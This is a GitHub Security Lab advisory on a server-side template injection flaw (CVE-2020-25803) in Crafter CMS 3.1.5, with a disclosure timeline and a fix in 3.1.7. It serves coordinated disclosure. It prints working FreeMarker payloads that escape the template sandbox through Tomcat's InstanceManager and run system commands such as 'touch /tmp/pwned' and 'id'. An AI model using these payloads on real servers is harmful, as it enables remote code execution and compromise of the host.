<header class="post-header d-block mb-6">
      <div class="date text-mono f5 my-3">August 19, 2020</div>
      <h1 class="my-2 h00-mktg lh-condensed">GHSL-2020-042: Server-Side Template Injection in Crafter CMS</h1>

      
      
      
      
      

      

      <a target="_blank" class="sc-frDJqD SgxRc d-inline-flex flex-row flex-items-center text-gray" href="https://github.com/pwntester">
        <img class="mr-3" src="https://avatars.githubusercontent.com/u/125701?s=35" height="35" width="35">
        <span>Alvaro Munoz</span>
      </a>
    </header>

    <main id="content" class="markdown-body" aria-label="Content">
      <h2 id="summary">Summary</h2>

<p>A user with privileges to edit a FreeMarker template may execute arbitrary Java code or run arbitrary system commands with the same privileges as the account running Crafter CMS.</p>

<h2 id="product">Product</h2>

<p>Crafter CMS</p>

<h2 id="tested-version">Tested Version</h2>

<p>3.1.5</p>

<h2 id="cve">CVE</h2>
<p>CVE-2020-25803</p>

<h2 id="details">Details</h2>

<h3 id="server-side-template-injection">Server-Side Template Injection</h3>

<p>Even though Crafter CMS does a good job disabling insecure defaults so that the <code class="language-plaintext highlighter-rouge">?new</code> built-in cannot be used since <a href="https://github.com/craftercms/craftercms/issues/2677">CVE-2018-19907 was fixed</a>, it still exposes a number of objects through the <a href="https://docs.craftercms.org/en/3.1/developers/projects/engine/api/templating-api.html">Templating API</a> that can be used to circumvent the sandbox and achieve remote code execution.</p>

<p>Deep inspection of the exposed objects’ object graph enables an attacker to get access to objects that allow them to instantiate arbitrary Java objects. In particular <code class="language-plaintext highlighter-rouge">${siteContext.servletContext}</code> gives us access to the Servlet Context where interesting objects can be found. We can then list all Servlet Context attributes with:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;#list siteContext.servletContext.getAttributeNames() as item&gt;
    &lt;p&gt;${item}&lt;/p&gt;
&lt;/#list&gt;
</code></pre></div></div>

<p>On a Tomcat server (used in official Crafter CMS Docker image), we get:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>javax.servlet.context.tempdir
org.apache.catalina.resources
org.apache.tomcat.InstanceManager
org.apache.catalina.jsp_classpath
org.apache.logging.log4j.web.Log4jWebSupport.INSTANCE
org.apache.jasper.compiler.TldCache
org.apache.tomcat.JarScanner
org.springframework.web.servlet.FrameworkServlet.CONTEXT.Spring MVC Dispatcher Servlet
javax.servlet.context.orderedLibs
org.apache.logging.log4j.spi.LoggerContext.INSTANCE
org.springframework.web.context.support.ServletContextScope
org.springframework.web.context.WebApplicationContext.ROOT
javax.websocket.server.ServerContainer
</code></pre></div></div>

<p>The most interesting one is <code class="language-plaintext highlighter-rouge">org.apache.tomcat.InstanceManager</code> which enables us to instantiate arbitrary objects. Note that this class is available on e.g. Jetty as well and similar classes are available in other servers. For example JBoss/WildFly exposes <code class="language-plaintext highlighter-rouge">org.wildfly.extension.undertow.deployment.UndertowJSPInstanceManage</code>.</p>

<p>We can then try to run arbitrary Java code using a <code class="language-plaintext highlighter-rouge">ScriptEngine</code>:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>${siteContext.servletContext.getAttribute('org.apache.tomcat.InstanceManager').newInstance('javax.script.ScriptEngineManager').getEngineByName('js').eval("java.lang.Runtime.getRuntime().exec('touch /tmp/pwned')")}
</code></pre></div></div>

<p>Or we can use <code class="language-plaintext highlighter-rouge">freemarker.template.utility.Execute</code> instead:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>${siteContext.servletContext.getAttribute('org.apache.tomcat.InstanceManager').newInstance('freemarker.template.utility.Execute')("touch /tmp/pwned")}
</code></pre></div></div>

<p><code class="language-plaintext highlighter-rouge">siteContext</code> also provides access to the FreeMarker configuration so it is possible to modify it to disable the sandbox:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;p&gt;&lt;b&gt;Disable TemplateClassResolver protection&lt;/b&gt;&lt;/p&gt;
&lt;#assign n=fc.setNewBuiltinClassResolver(fc.getDefaultConfiguration().getNewBuiltinClassResolver())&gt;
&lt;#attempt&gt;
    &lt;p&gt;- ${"freemarker.template.utility.Execute"?new()("id")}&lt;/p&gt;
&lt;#recover&gt;
    &lt;p&gt;- ${.error}&lt;/p&gt;
&lt;/#attempt&gt;
</code></pre></div></div>

<h4 id="impact">Impact</h4>

<p>This issue may lead to <code class="language-plaintext highlighter-rouge">Remote Code Execution</code>.</p>

<h2 id="coordinated-disclosure-timeline">Coordinated Disclosure Timeline</h2>

<ul>
  <li>03/23/2020: Filed <a href="https://github.com/craftercms/craftercms/issues/3911">issue on github</a> asking for security contact</li>
  <li>03/23/2020: Sent report to: security@craftersoftware.com</li>
  <li>05/04/2020: Fix is shared with GitHub Security Lab for review.</li>
  <li>06/03/2020: Fix is released as part of 3.1.7 version.</li>
</ul>

<h2 id="credit">Credit</h2>

<p>This issue was discovered and reported by GHSL team member <a href="https://github.com/pwntester">@pwntester (Alvaro Munoz)</a>.</p>

<h2 id="contact">Contact</h2>

<p>You can contact the GHSL team at <code class="language-plaintext highlighter-rouge">securitylab@github.com</code>, please include the <code class="language-plaintext highlighter-rouge">GHSL-2020-042</code> in any communication regarding this issue.</p>

  